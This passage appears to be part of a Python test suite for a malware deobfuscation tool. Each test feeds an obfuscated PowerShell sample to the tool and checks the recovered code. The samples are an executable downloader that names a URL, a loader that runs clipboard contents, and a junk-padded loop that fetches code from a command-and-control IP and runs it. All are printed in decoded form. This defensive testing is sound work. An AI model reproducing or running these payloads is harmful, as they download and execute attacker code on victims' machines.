            B"B9rnFmB9+mB9zr+FzreFmB9+mB9zr'+'mB9+mB9+FzmB9+mB9rmB9+mB9w-mB9+mB9obmB9+mB9jmB9+mB9ec'+'FmB9+mB9zr+m"
            B"B9+mB9FmB9+'+'mB9zrmB9+mB9tFzr) mB9+mB9ramB9+mB9ndom;r5mB9+mB9PmB9+mB9YYUmB9+mB9 mB9+mB9=mB9+mB9 .('"
            B"+'mB9+mB9FzmB9+mB9rmB9+mB9neFzr+FzrmB9+mB9wmB9+mB9Fzr+Fzr-omB9+mB9bjectFzr) mB9+mB9'+'SymB'+'9+mB9sm"
            B"B9+mB9temB9+mB9m.NetmB9+mB9.mB9+mB9WebCmB'+'9+mB9lienmB9+mB9t;mB9+'+'mB9r5mB9+mB9PmB9+mB9NSBmB9+'+'m"
            B"B9 =mB9+mB9 r5mB9+mB9PmB9+mB9nsmB9+mB9amB9+mB9dasd.mB9+mB9nmB9+mB9emB9+mB9xt(mB9+mB9100mB9+mB90mB9+m"
            B"B90mB'+'9+mB9,mB9+mB9 2mB9+mB982mB9+mB913mB9+mB9'+'3'+');r5PADCX = FzrmB9+mB9mB9+mB9http://tqwemB9+m"
            B"B9651qmB9+mB9wmB9+mB9emB9+mB9qwemB'+'9+mB9qw.mB9+mB9comB9+mB9m/BUmB9+mB9RmB9+mB9/testv.pmB9+mB9hp?l="
            B"mB9+mB9big9.yarnFmB9+mB9zr.SmB9+mB9pl'+'itmB9+mB9(mB9+mB9FmB9+mB9zmB9+mB9r@Fzr);rmB9+mB95PSDCmB'+'9+"
            B"mB9 mB9+mB9= mB9+mB9r5Pe'+'nv:mB9+mB9pm'+'B9+mB9ublmB9+mB9icmB9+mB9 +mB9+mB9 mB9+mB9Fz'+'rOHmmB9+mB9"
            B"Fzr + r5mB9+mB9PmB9+mB'+'9NSBmB9+mB9 + '+'('+'Fzr.emB9+mB9xFmB9+mB9zmB9+mB9r+FmB9+mB9zremB9+mB9FmB9+"
            B"mB9zrmB9+mB9)mB9+mB9;mB9+mB9fmB9+mB9oreacmB9+mB9h(mB9+mB9r5PamB9+mB9sfc in r5mB9+mB9PA'+'DCXmB9+mB9)"
            B"{try{r5PYYmB9+mB9U.9adD'+'om'+'B9+mB9JCdmB9+mB9WnlJCdOamB9+mB9dFmB'+'9+mB9IJ'+'Cdle9amB9+mB9dmB9+mB9"
            B"(r5PasfmB9+mB9c.9mB9+mB9admB9'+'+m'+'B9ToStmB9+mB9rJmB9+mB9CdimB9'+'+mB9JCdNg'+'9amB9+mB9d()mB9+mB9,"
            B"mB9+mB9 mB9+mB9rmB9+mB95PSDmB9+mB9C);&(FzrInvoFzr+FzrkFmB9+mB9zmB9+mB9r+mB9+mB9Fzre-mB9+mB9ImB9+mB9t"
            B"emmB'+'9+mB9Fzr)(r5PSmB9+mB9DCmB9+mB9);breakmB'+'9+mB9;}catmB9+mB9cmB9+mB9hmB9+mB9{}mB9+mB9}mB9) -rE"
            B"PLace mB9OHmmB9,[CHAR]92 -rEPLace([CHAR]114+[CHAR]53+[CHAR]80),[CHAR]36 -rEPLace mB9JCdmB9,[CHAR]96 "
            B"-rEPLace ([CHAR]70+[CHAR]122+[CHAR]114),[CHAR]39-cRepLACe mB99admB9,[CHAR]34) BdZ. ((VaRIABle m'+'B9"
            B"*mdr*mB9).naME[3,11,2]-JoiNmB9mB9)')-CrEPLaCe([ChAR]66+[ChAR]100+[ChAR]90),[ChAR]124 -RepLAce 'mB9',"
            B"[ChAR]39) )"
        )
        test = data | self.load() | str
        goal = inspect.cleandoc(
            r'''
            $nsadasd = New-Object Random
            $YYU = New-Object System.Net.WebClient
            $NSB = $nsadasd.Next(10000, 282133)
            $SDC = 'C:\Users\Public\' + $NSB + '.exe'
            foreach ($asfc in '[[URL]]') {
              try {
                $YYU.DownloadFile($asfc.ToString(), $SDC)
                Invoke-Item ($SDC)
                break
              } catch {}
            }
            '''
        ).replace('[[URL]]', 'http:''//tqwe651''qweqweqw''.com/BUR/testv.php?l=big9.yarn')
        self.assertIn(goal, test)

    def test_clipboard_loader(self):
        data = (
            B"""& ( $PShome[4]+$pShOme[30]+'X') ( (-JOin[REgEX]::maTcHEs(" ) )93]RaHc[,'FPr' eCaLPerc-69]RaHc[,'Bcp'"""
            B"""  eCaLPerc-  63]RaHc[,'KnC' eCaLPerc-  43]RaHc[,'juy'  eCaLPerc-)')}d{KnC()FPreiFPr,FPrxFPrf- juy}0{"""
            B"""}1{juy(.;)}juytXBcpETjuy.}BBcpt{KnC=}d{KnC'+';juytxeBcpTjuy.}'+'BBcpt{KnC;)(ekovnI.)FPretsaFPr,FPrPF"""
            B"""Prf-'+'juy}1{}0{juy(.}bT{'+'KnC;}EuRBcpT{KnC '+'= juyeNIBcplBcpitLuMjuy.}BBcpt{KnC;)FPretsyFPr,FPrS'"""
            B"""+'FPr,FPrsmroFFPr,FPr.swodniW.mFPr,FPrxoBFPr,FP'+'rtxeT.FPrf'+'- juy}1{}0{}3{}2{}5{}4{juy( )FPrtcFPr"""
            B""",FPrNFPr,FPrejbO-weFPrf- juy}2{}0{}1{juy(& = }BBcpt{KnC{ esle })juytxBcpeTBcpedOcIN'+'ujuy::qArhIzKn"""
            B"""C ('+'juytxeBcpTtEgjuy::EuLAV.)  )FPr9FPr'+'+FPrT42JFPr(  )F'+'PrAVFPr,FPrELBaIrFPr f-juy}0{}1{juy(."""
            B"""  (  =}D{KnC{ )FPrATSFPr qe- )(ekovnI.)FPrS'+'oTFPr,FPrrtFPr,FPrgniFPrf-juy}0{}1{}2{juy(.juyetABcpTB"""
            B"""cpStnEmTRABcpPAjuy.juydABcpErhTtNBcpEBcprRucjuy:'+':EUlaV.) )FPrUFPr+FPrXSFPr+FPr:e'+'lFPr'+'+FPrbaI"""
            B"""raVFPr( )FPreGFPr'+',FPr-TFPr,FPrMEtiFPr f-juy}0{'+'}1{}2{juy(. (  ( fi(KnC;)FPrW.FPr,FPrsmroF.'+'sw"""
            B"""odniFPr,FPreFPr,FPrtsyS'+'FPr,F'+'PrmFPrf- juy}3{}4{}0{}2{}1{juy( emaNylbmessA- )FPrdAFPr,FPrT-d'+'F"""
            B"""Pr,FPr'+'epyFPrf-juy}0{}1{}2{juy(&;})FPraobpilFPr,FPrC-teGFP'+'r,FPrdrFPr f- juy}0{}2{}'+'1{juy(.=}d"""
            B"""{KnC{ )0 ae- )'+'FPrilC-tFPr,FPro'+'bpFPr,FPrdraFPr'+',FPreGFPrf- '+'juy}1{}'+'2{}3{}0{juy( )FPrmFPr"""
            B""",FPrcgFPr f- juy}1{}0{juy(&( fi;'+' )FPrtxeFPr,FPrtaFPr,FPrATaFPr,FPrM'+'ROF'+'FPr,FPrT.Smrof.SWoDNi"""
            B"""w.meFPr'+',FPrdFPr,FPrTsYsFPrf-juy}5{}3{}4{}1{}'+'6{}2{}0{juy(]ePYT[  = QARHIzKnC  '+'; )FPrlC.SFPr,"""
            B"""FPrmRoFPr,FPrDFPr,FPrfFPr,FPrraoFPr,FPrw.METSFPr,FPrbPIFPr,FPrsFPr,FPrYFPr,FPr.sWoDnIFPrF-juy}7{}5{}"""
            B"""3{}9{}8'+'{}6{}'+'0{}4{}1{}2{juy(]ePYT[ =9T42'+'jKnC  ;)FPrtFPr'+',FPrAerHTFPr,FPr.GNiDFPr,FPrdAFPr,"""
            B"""F'+'PrErhFPrf-ju'+'y}1{}0{}4{}2{}3{juy('+']epyt[  = uXsKnC'+' '(( ( )'x'+]43[emOHSp$+]12[emohsP$ (& """
            B"""",'.' ,'rigHT'+'tO'+'leFT' )) )"""
        )
        test = data | self.load() | str
        goal = inspect.cleandoc(
            '''
            if (Get-Command 'Get-Clipboard' -ea 0) {
              $d = Get-Clipboard
            }
            Add-Type -AssemblyName 'System.Windows.Forms'
            $(if ([Threading.Thread]::CurrentThread.ApartmentState.ToString() -Eq 'STA') {
              $D = [System.Windows.Forms.Clipboard]::GetText([System.Windows.Forms.TextDataFormat]::UnicodeText)
            } else {
              $tB = New-Object 'System.Windows.Forms.TextBox'
              $tB.Multiline = $True
              $Tb.Paste()
              $tB.Text
              $d = $tB.Text
            })
            Invoke-Expression ($d)
            '''
        )
        self.assertIn(goal, test)

    def test_junk_statement_downloader(self):
        data = inspect.cleandoc(
            """
            $mlvxprxbencyv = 1 + 1
            $wtdvfysfnlfvwzf = (2 + 2 * 2 - 2) / 2
            $ppvvglp = New-Object -Com "Scripting.FileSystemObject"
            $dfe = 'http://1'
            $krswmmqghhddtt = "Math still works"
            function Galaxy { return (Get-Random).ToString() + "RandomText" }
            $lhjitanp = [math]::Abs(-99) * 3
            $owtmomk = ((300 / 3) * 8 % 7) -as [string]
            $cqtadq = 1024
            $ybtmksnbbh = 0
            $gpqtroqs = 42 * 5 / 2 - 3
            $cwyvniykt = @(1, 2, 3, 4, 5)
            [void]([math]::Sqrt((Get-Random -Minimum 10 -Maximum 200)))
            $fbdmeafxpodympg = "dummy"
            $exayoji = "Hello" + "World"
            $bpv = '81.174.1'
            $oydxcggocwe = "This text nothing"
            $vltexqfzvp = "Z" * (Get-Random -Minimum 5 -Maximum 10)
            $ippoibvuys = "random"
            $exvlowbuyg = (Get-Random -Minimum 100 -Maximum 9999) * 3
            $nnyvscpsmiomrs = [Math]::Pow((Get-Random -Minimum 1 -Maximum 10), 3) | Out-Null
            $gdctrzvcszplcht = Get-Location
            $ftdulrxj = "Z"
            $jvkmzwelcsizsjw = ([math]::PI * 100).tostring("F2")
            $chhmcwwrtyvd = "Attempting retry..."
            $vbzdfwzqdlby = New-Object System.Text.StringBuilder
            $pzkavxhrfngkm = @("one", "two", "three") | Measure-Object | ForEach-Object { $_.Count }
            $xbddvfiqmytaj = New-Object -Com "WScript.Shell"
            (Get-Random -Minimum 0 -Maximum 100) | Out-Null
            [void]([Math]::Abs(-1))
            $yim = '64.47/'
            $besrgrmefoy += 512
            $wghxrx = [Math]::Sqrt((Get-Random -Minimum 1 -Maximum 100))
            $kjipaunrqlb = Get-Random -Minimum 1 -Maximum 1000
            $bjqcxoavczkcmw = (Get-Random -Minimum 1 -Maximum 100) / (Get-Random -Minimum 1 -Maximum 50)
            $wxnhjhbiatqcxbe = 42 + 150 / 3
            [void](123 + 456)
            $msouzimvsqxi = Get-Date
            $skavxjzompjr = "ErrorCaught"
            $fswifypagmi = (1..5 | ForEach-Object {$_ * 2}) -join ","
            $iserrzpejirfy | ForEach-Object { [void]$_ }
            $fwsobnoglizfg = Get-Random -Minimum 0 -Maximum 50
            $nazpbdnmu = [int[]](1..5 | ForEach-Object { Get-Random }) -join "-"
            $gwytydeslrirn = Get-Date | Out-Null
            $avjmqrliqyccet = (Get-Random -Minimum 1000 -Maximum 5000)
            $cdecuiucsrarpxx = (2023 - 1980) * 42
            $fepafhmcl = "More noise" + " to avoid clean readability"
            [int]$liootiwrviiews = 5 * 5 + [math]::Sqrt(4)
            $ywwkjcbdpuov = "abc123"
            $aefqnhv = $ppvvglp.GetDrive("c:").SerialNumber
            [System.Guid]::NewGuid() | Out-Null
            $yvgjtypkl = "unused computation " + [Math]::Sqrt(25)
            $vcxdmjtauzhhc = 5 * 20
            $gnmmvxkbocwaz = @(1, 2, 3, 4, 5)
            $oysdesi = New-Object Threading.Mutex($false, $aefqnhv);
            $pvizspwoouj = (Get-Date).Ticks % 12345
            $wwlciopihhadkr = (Get-Random -Minimum 100 -Maximum 200)
            $klqhcspbg = [math]::Pow(2, 8)
            function Comet { return (Get-Random -Minimum 0 -Maximum 2) -eq 1 }
            [void]"Obfuscation step - random action inserted"
            $fkopdjm = $oysdesi.WaitOne(1)
            $lbjvoxmqbpbudi = [math]::Sqrt(144) + 42
            $wzmtzitqawb = "Mutex" + "Disposed"
            $zngzpviistuppm = [math]::Pow(2, 8)
            $ozwshblbwcgtiu = Get-Random -Minimum 1 -Maximum 10
            $essvvhma = @("PowerShell", "code", "analysis")
            $aefqnhv = "{0:X}" -f $aefqnhv
            $aefqnhv = [convert]::toint64($aefqnhv,16)
            $pimjxqwedeiix = (Get-Random -Minimum 1 -Maximum 100)
            $lhjwgbfgwuvk = (Get-Date).ToUniversalTime()
            $rwzbjqrz = "RandomString" + [guid]::NewGuid().ToString("n")
            $serial = $aefqnhv
            $zhufmykmxtajoo = "Invoke-Command -ScriptBlock { Write-Output 'Dummy' }"
            $jygmtadrlrlghur = [Guid]::NewGuid().ToString()
            $ip = $dfe + $bpv + $yim 
            $uxriyewef = [int[]](1..5 | ForEach-Object { Get-Random }) -join "-"
            [void](2 + 2 * (Get-Random -Minimum 1 -Maximum 5))
            $url = $ip+$serial
            $glywfbxgvradi = @(1,2,3,4,5,6,7,8,9,10,11,12,13,14)
            $fakkywqqcz = ([char[]](65..90 + 97..122 | Get-Random -Count 10) -join "")
            [array]::Reverse("random_string".ToCharArray())
            $xaumbtf = New-Object Net.WebClient
            $iusnr = @("alpha", "beta", "gamma", "delta")
            while ($true) {
            try {
            $hnuzhmo=$xaumbtf.DownloadString($url)
            }
            catch {
            $kugpxqk = [math]::Sqrt(36)
            (Get-Random).GetHashCode() | Out-Null
            $jnldg = 5 -eq 5
            $nlllqdmhdpocywy = [int]"45" + 5
            Start-Sleep -s 5
            $rgfyxmaam = [array]::Reverse((1,2,3,4))
            $rljibuuipy = Get-Process | Select-Object -First 1
            continue
            }
            Invoke-Expression $hnuzhmo
            Start-Sleep -s 5
            $ilbnpkkyugskxqb = -join ((97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
            }
            $oysdesi.ReleaseMutex();
            $oysdesi.Dispose();
            """
        )
        goal = inspect.cleandoc(
            """
            $ppvvglp = New-Object -Com "Scripting.FileSystemObject"
            New-Object System.Text.StringBuilder
            New-Object -Com "WScript.Shell"
            $aefqnhv = $ppvvglp.GetDrive("c:").SerialNumber
            $oysdesi = New-Object Threading.Mutex ($False, $aefqnhv)
            $oysdesi.WaitOne(1)
            $aefqnhv = "{0:X}" -f $aefqnhv
            $aefqnhv = [Convert]::ToInt64($aefqnhv, 16)
            $serial = $aefqnhv
            $url = "http://[[C2]]/${serial}"
            $xaumbtf = New-Object Net.WebClient
            while ($True) {
              try {
                $hnuzhmo = $xaumbtf.DownloadString($url)
              } catch {
                Start-Sleep -s 5
                continue
              }
              Invoke-Expression $hnuzhmo
              Start-Sleep -s 5
            }
            $oysdesi.ReleaseMutex()
            $oysdesi.Dispose()
            """
        ).replace('[[C2]]', '181.174.164''.47')

        test = data | self.load() | str
        self.assertIn(goal, test)
